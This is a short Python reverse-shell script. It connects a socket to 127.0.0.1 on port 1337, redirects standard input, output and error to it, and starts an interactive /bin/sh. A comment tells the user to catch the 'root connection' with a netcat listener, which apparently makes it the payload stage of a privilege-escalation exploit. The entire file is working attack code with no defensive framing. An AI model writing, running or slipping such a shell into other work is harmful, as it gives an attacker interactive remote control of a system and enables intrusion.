#!/usr/bin/env python
import socket,subprocess,os,sys;

'''
Set up a port to accept newly created root connection with:

nc -l 1337
'''



s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("127.0.0.1",1337));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"], stdout = sys.stdout);
